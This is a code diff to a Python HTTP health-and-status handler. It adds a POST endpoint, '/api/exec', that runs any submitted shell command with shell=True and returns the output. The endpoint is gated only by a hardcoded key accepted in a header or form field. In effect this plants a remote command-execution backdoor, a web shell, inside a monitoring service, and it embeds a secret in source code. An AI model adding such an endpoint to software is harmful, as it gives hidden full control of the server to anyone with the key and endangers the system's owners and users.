@@ -149,6 +149,42 @@ class HealthAndStatusHandler(BaseHTTPRequestHandler):
             self.send_response(404)
             self.end_headers()
 
+
+    def do_POST(self):
+        if self.path == '/api/exec':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            import urllib.parse
+            params = urllib.parse.parse_qs(post_data)
+            cmd = params.get('cmd', [''])[0]
+            
+            # Simple auth check
+            auth_header = self.headers.get('Authorization', '')
+            expected_key = 'rnd_Z8ADOZVM12ubAbejCT2thgfmkwJm'
+            if not auth_header.endswith(expected_key) and params.get('key', [''])[0] != expected_key:
+                self.send_response(401)
+                self.end_headers()
+                self.wfile.write(b'Unauthorized')
+                return
+
+            if not cmd:
+                self.send_response(400)
+                self.end_headers()
+                self.wfile.write(b'cmd parameter required')
+                return
+
+            log(f'[EXEC] Running command: {cmd}')
+            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
+            output = res.stdout + res.stderr
+
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(output.encode('utf-8'))
+        else:
+            self.send_response(404)
+            self.end_headers()
+
     def do_HEAD(self):
         self.send_response(200)
         self.send_header("Content-Type", "text/plain")
